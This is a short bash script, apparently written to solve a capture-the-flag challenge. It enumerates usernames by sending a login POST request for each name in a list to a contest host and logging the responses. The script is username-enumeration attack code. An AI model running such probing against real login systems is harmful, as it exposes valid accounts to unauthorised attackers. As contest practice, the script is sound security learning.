while read line
do
    echo $line >> check.txt
    curl -X POST -s -d "name=$line&password=Test" https://spy.quals.beginners.seccon.jp | grep -o It.*page. >> check.txt
done < employees.txt